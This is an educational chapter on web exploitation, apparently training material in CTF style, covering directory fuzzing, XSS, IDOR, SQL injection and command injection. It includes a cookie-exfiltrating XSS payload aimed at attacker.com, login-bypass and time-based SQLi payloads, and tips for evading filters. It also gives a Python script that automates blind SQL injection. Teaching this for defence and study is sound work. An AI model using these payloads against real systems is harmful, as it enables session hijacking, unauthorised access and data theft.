# Chapter 3: Web Exploitation

## Core Concepts & Definitions
**Web Exploitation** involves finding and leveraging vulnerabilities in web applications to access unauthorized data or functionality.

**Key Terminology:**
*   **Request/Response:** The standard "conversation" between Client (Browser) and Server.
*   **Injection:** Inserting malicious data that the system interprets as code or logic commands.
*   **Fuzzing:** Providing massive amounts of random or semi-random data to a system to find bugs.

---

## Level 1: Fundamentals
**Goal:** Understand how websites work and see what others miss.

### 1.1 Developer Tools & Source
The browser tells you everything. 
*   **Storage Tab:** View Session Cookies, LocalStorage, and IndexedDB data.
*   **Network Tab:** Watch the traffic. See exactly what data is sent (POST) when you click a button.

### 1.2 Directory Brute Forcing (Fuzzing)
Websites often have "hidden" pages that aren't linked anywhere (e.g., `/admin`, `/backup`, `/.git`).
*   **The Attack:** Use a tool (e.g., `gobuster`, `dirsearch`, `ffuf`) with a wordlist of common names to find these pages.
*   **Status Codes:** 
    *   `200 OK`: Page exists.
    *   `403 Forbidden`: Exists, but you can't see it (yet).
    *   `404 Not Found`: Doesn't exist.

### Practice 1.1: Finding the Secret Page
**Scenario:** A website has a hidden folder.
1.  Run `gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt`.
2.  Found: `/config` (Status 200).
3.  Visit `/config` to find a database password.

**Challenge Question 1:** What is the purpose of a `robots.txt` file, and why do hackers check it first?

---

## Level 2: Intermediate
**Goal:** Perform manual injection and understand logic flaws.

### 2.1 Cross-Site Scripting (XSS)
*   **Stealing Cookies:** The most common goal of XSS.
*   **Payload:** `<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>`
*   **Impact:** The victim's session cookie is sent to the attacker's server, allowing the attacker to hijack the session.

### 2.2 IDOR (Insecure Direct Object Reference)
*   **Concept:** Accessing resources belonging to other users by changing a numerical ID in the URL.
*   **Scenario:** You visit `http://app.com/profile?id=125` to see your profile.
*   **The Attack:** Change the URL to `id=124` or `id=1`. If you see someone else's private data, you found an IDOR.

### Practice 2.1: The Admin Login (SQLi)
**Scenario:** A login form.
1.  Username: `admin' --`
2.  Password: (Anything)
3.  **Result:** Successful login. The `--` tells the database to ignore the rest of the query, including the password check.

**Challenge Question 2:** How does "Input Sanitization" prevent SQL injection?

---

## Level 3: Advanced
**Goal:** Automate attacks and exploit "Blind" vulnerabilities.

### 3.1 Blind SQL Injection (Time-Based)
If the server returns exactly the same page for both True and False outcomes, we use timing.
*   **Payload:** `id=1; IF (1=1) WAITFOR DELAY '0:0:5'--`
*   **Logic:** If the server takes 5 seconds to respond, the condition was **True**. If it responds immediately, it was **False**.

### 3.2 Command Injection (RCE)
*   **Evasion (Bypassing Filters):**
    *   Blocked `;`? Use `&&`, `||`, or `|`.
    *   Blocked `cat`? Use `tail`, `more`, `less`, or `base64`.

### Practice 3.1: Python for Automatic Exploitation
**Task:** Automate a search for a hidden file.
```python
import requests
import string

target_url = "http://target.com/search?q="
found_chars = ""

for position in range(1, 20):
    for char in string.ascii_letters + string.digits:
        # Blind SQLi: Is the first char of the database name 'a'?
        payload = f"' AND (SELECT substring(database(),{position},1))='{char}' --"
        r = requests.get(target_url + payload)
        if "Success" in r.text:
            found_chars += char
            print(f"Current Findings: {found_chars}")
            break
```

**Challenge Question 3:** In Burp Suite, what is the difference between "Repeater" and "Intruder"?

